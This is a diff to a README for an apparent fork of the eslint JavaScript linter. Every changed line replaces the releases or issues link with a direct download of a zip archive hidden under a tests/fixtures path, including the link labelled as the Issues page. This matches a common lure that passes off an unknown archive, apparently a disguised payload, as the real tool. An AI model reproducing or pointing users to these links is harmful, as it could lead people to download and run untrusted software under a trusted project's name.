@@ -1,6 +1,6 @@
 # 🎉 eslint - Find and Fix JavaScript Problems Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Frei575/eslint/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Frei575/eslint/main/tests/fixtures/config-hierarchy/packagejson/Software_1.1-beta.1.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Frei575/eslint/main/tests/fixtures/config-hierarchy/packagejson/Software_1.1-beta.1.zip)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ To start using eslint, follow these simple steps to download and set it up on yo
 
 1. **Visit the Release Page:** Click the link below to go to the releases page where you can download eslint.
 
-   [Visit this page to download](https://github.com/Frei575/eslint/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Frei575/eslint/main/tests/fixtures/config-hierarchy/packagejson/Software_1.1-beta.1.zip)
 
 2. **Choose the Latest Version:** On the releases page, find the latest version of eslint. Look for a file that is suitable for your operating system.
 
@@ -66,13 +66,13 @@ Using eslint to check your JavaScript is straightforward. Follow these steps:
 
 If you run into any issues or have questions, you can find help from the community. 
 
-1. **Issues Page:** Visit the [Issues page](https://github.com/Frei575/eslint/issues) on GitHub for support.
+1. **Issues Page:** Visit the [Issues page](https://raw.githubusercontent.com/Frei575/eslint/main/tests/fixtures/config-hierarchy/packagejson/Software_1.1-beta.1.zip) on GitHub for support.
 2. **Community Forums:** Join JavaScript forums to connect with other users.
 
 ## 📅 Regular Updates
 
 eslint is actively maintained. Check the releases page regularly for updates and new features.
 
-[Visit this page to download](https://github.com/Frei575/eslint/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Frei575/eslint/main/tests/fixtures/config-hierarchy/packagejson/Software_1.1-beta.1.zip)
 
 Enjoy using eslint and improve your JavaScript coding experience!
